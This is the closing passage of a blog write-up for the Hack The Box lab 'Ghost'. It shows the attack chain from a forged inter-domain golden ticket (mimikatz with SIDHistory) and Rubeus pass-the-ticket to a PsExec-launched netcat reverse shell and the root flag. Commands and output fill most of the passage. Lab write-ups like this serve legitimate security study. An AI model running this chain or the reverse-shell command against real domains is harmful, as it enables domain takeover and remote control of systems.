class="SemanticString"> to ensure it won’t lose access to resources in the original domain. Here, I’ve added the SID of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ghost.htb</code></span><span class="SemanticString">&#x27;s Enterprise Admins group to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SIDHistory</code></span><span class="SemanticString">. Because of the trust relationship between the domains, the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ghost.htb</code></span><span class="SemanticString"> KDC would blindly trust the SID history, effectively treating the user as if they were a former member of the Enterprise Admins group, and granting them administrative access in the domain.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780baa9f6d96ead356d39" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>mimikatz #</span></mark></span><span class="SemanticString"><span> kerberos::golden /user:Administrator /domain:corp.ghost.htb /sid:S-1-5-21-2034262909-2733679486-179904498 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /rc4:053fc16b43d14e3a3ade43c1f2c259f6 /service:krbtgt /target:ghost.htb /ticket:ticket.kirbi

User      : Administrator
Domain    : corp.ghost.htb (CORP)
SID       : S-1-5-21-2034262909-2733679486-179904498
User Id   : 500
Groups Id : *513 512 520 518 519 
Extra SIDs: S-1-5-21-4084500788-938703357-3654145966-519 ; 
ServiceKey: 053fc16b43d14e3a3ade43c1f2c259f6 - rc4_hmac_nt      
Service   : krbtgt
Target    : ghost.htb
Lifetime  : 5/25/2025 4:44:52 AM ; 5/23/2035 4:44:52 AM ; 5/23/2035 4:44:52 AM
-&gt; Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780129c04efca4138d305" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f780659f3ed58ec87652cf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Requesting TGS:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7801085d7c99cd80a3909" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the trust ticket obtained, I can request a TGS for the CIFS service from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DC01</code></span><span class="SemanticString">, which grants filesystem access:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7808d94d0d63d1ae8becc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Public\Documents&gt;</span></mark></span><span class="SemanticString"><span> .\Rubeus.exe asktgs /ticket:ticket.kirbi /service:cifs/dc01.ghost.htb /dc:dc01.ghost.htb /nowrap /ptt


   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: &#x27;cifs/dc01.ghost.htb&#x27;
[*] Using domain controller: dc01.ghost.htb (10.129.231.105)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIFAjCCBP6gAwIBBaEDAgEWooIEAzCCA/9hggP7MIID96ADAgEFoQsbCUdIT1NULkhUQqIhMB+gAwIBAqEYMBYbBGNpZnMbDmRjMDEuZ2hvc3QuaHRio4IDvjCCA7qgAwIBEqEDAgEEooIDrASCA6j7PEkNngZ6fHXssCLuUI2AUv2AkYGB+2ZRS401dm0PKdNh0sd5sR/+KNjI+U/Rb2McYMw8tTIfsT6WvliJQ/XpSQllycr4S3SKA0bZJTJUGHKB1D2ydfnRrTeBlU7hzsd3oD4tlKkGEPR+XujWz06QFzBjpgd2ZD1X2M+WGz8Enzfeh9I7k24nlAqWPxq8htHWFTaa6bkCFX4Fljwt99bedkQUwfFbhstwODe96XiZ/7HNG1UkV1Q5jGBqRP04W2EotWLcqizUjhee/qPH1yomqlRt3puyJiLNS4Pjcvh2vjAvAVCkfQWYvOCpVlHUHTyypkpDBa741yn0DMpR/O5WDfAoBHVNnP96Y51fc/9vVNI9Fh2iP40nxajCoal798Zgu3VyCIf8Kpw3r7RNeVZL/FKn7AQHea9Ekq2BsrUuzjPkA07DhLY0M9Mti8R0htdVRqfaxStfPdOcfJvTW8zDJs5CNHVcx3j37OpscWyhQVL/DiXmo/pM5IVc08S/5w4bQLDIIqZGYN/obsEdEJgrOfsPCoFXKWajyK5ITPcrf2jLPfDZfZTR7KI8xBjCyYsZIEPICXpTKq5hCulynYppVMgh5hdtsZF4iCiVZUj92nk0uNy6Dj9H28ZEHmfWiCiSK0AdkF0sCq4NMb2tXguA+T6G2Rtd6HmN1GBz55vSFoogNBO/VEHmWLfCiDHAZOjcdvG20c/zdrNIJ+Mj2iqnl3P9fVtIcmf3s9K42DtZdEcFfjjydWAa8bJbyOQQ2j05C8Swo5EKg6qPqYwJDDbNlxVgegflAalIXo9m/ouNpEOvc/4BuNkA6dSh+8hgMQXjkbd65YPcXQPQ/kD9soctnzyXTS34+jV8Y9UoAXf01m9JTIskdc95e9LnV3C0a/69W8tc+0s/Qb3LO5hALZ3+hF2Jb3p82DvxMWgNj/5GQIs1Ocr5qQpDaLNR7CanMA2+7pi+CuOv7DkNT6VpKu5tBvNaTwgve9lItlTVifmr4KTcZOgBwlReK6m10ggke0nKI7m7OW3tuJSzhBH+kbyz9C1IB/be9SFoNuJI7/CKOmhiLir9IsG99OjdQx4DtDCO6sToWbKSKMRdg7Z8Ci0Zeg4rwKk1F2FTbHJkT0hzjUfHytNHIj6/tjUZCZLscmf7hVMkNUeYfxI9NYkEoJOcm1s1RhyXBxp+oNZyAVGAtl88IdpFJ5kWj9Qm8x+bQkcwBDXyPx0d3Opq5L/+5tnKjgHAKkzzYSGjgeowgeegAwIBAKKB3wSB3H2B2TCB1qCB0zCB0DCBzaArMCmgAwIBEqEiBCDG/HaBvGu3ffRXYa1lP/NFJvSbHZXjg+s8FGAm6OOx/6EQGw5jb3JwLmdob3N0Lmh0YqIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEClAAClERgPMjAyNTA1MjUxMTQ5MzNaphEYDzIwMjUwNTI1MjE0OTMzWqcRGA8yMDI1MDYwMTExNDkzM1qoCxsJR0hPU1QuSFRCqSEwH6ADAgECoRgwFhsEY2lmcxsOZGMwMS5naG9zdC5odGI=

  ServiceName              :  cifs/dc01.ghost.htb
  ServiceRealm             :  GHOST.HTB
  UserName                 :  Administrator
  UserRealm                :  corp.ghost.htb
  StartTime                :  5/25/2025 4:49:33 AM
  EndTime                  :  5/25/2025 2:49:33 PM
  RenewTill                :  6/1/2025 4:49:33 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  xvx2gbxrt330V2GtZT/zRSb0mx2V44PrPBRgJujjsf8=</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780a08d8ee36eaf669915" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/ptt</code></span><span class="SemanticString"> flag in the command loads the ticket into the current session. Now I can list directories on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DC01</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780d8b387f791d95cc7f5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Public\Documents&gt;</span></mark></span><span class="SemanticString"><span> dir \\dc01.ghost.htb\c$

 Volume in drive \\dc01.ghost.htb\c$ has no label.
 Volume Serial Number is 2804-C13F

 Directory of \\dc01.ghost.htb\c$

05/08/2021  01:20 AM    &lt;DIR&gt;          PerfLogs
07/22/2024  09:55 AM    &lt;DIR&gt;          Program Files
07/22/2024  09:55 AM    &lt;DIR&gt;          Program Files (x86)
02/04/2024  02:48 PM    &lt;DIR&gt;          Users
07/10/2024  03:08 AM    &lt;DIR&gt;          Windows
               0 File(s)              0 bytes
               5 Dir(s)   3,644,932,096 bytes free</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780cebf6fe84e1a930cfe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll copy the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString"> binary to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DC01</code></span><span class="SemanticString">, and run it with </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a></span><span class="SemanticString"> to send back a reverse shell.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f78088ad8bcede32548c7b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Public\Documents&gt;</span></mark></span><span class="SemanticString"><span> copy nc64.exe \\dc01.ghost.htb\c$\users\public\documents\nc64.exe

        1 file(s) copied.

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Public\Documents&gt;</span></mark></span><span class="SemanticString"><span> .\psexec.exe -accepteula \\dc01.ghost.htb cmd.exe /c &quot;c:\users\public\documents\nc64.exe 10.10.14.38 8001 -e cmd.exe&quot;


PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

Starting cmd.exe on dc01.ghost.htb...1.ghost.htb...</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f78016af24f9298c4b67bb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Finally, the box is rooted. That took a while!</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f78016af02d53d18a3a5cc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001

listening on [any] 8001 ...
connect to [10.10.14.38] from (UNKNOWN) [10.129.231.105] 57515
Microsoft Windows [Version 10.0.20348.2582]
(c) Microsoft Corporation. All rights reserved.

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Windows\system32&gt;</span></mark></span><span class="SemanticString"><span> whoami

corp\administrator</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780458be0e469a0d14e8a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f780ce972bd8d4cbb5087f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780228536efac4b046d75" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Administrator\Desktop&gt;</span></mark></span><span class="SemanticString"><span> type root.txt

17f8a920************************</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780eea0dfda334484ba73" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f780aa96f4e834627f6b21" class="Divider"></div></article>
  <footer class="Footer">
  <div>&copy; C:\Users\ch3ng &gt;_ 2025</div>
  <div>&centerdot;</div>
  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
      rel="noopener noreferrer">Notablog</a>.
  </div>
</footer>

</body>

</html>
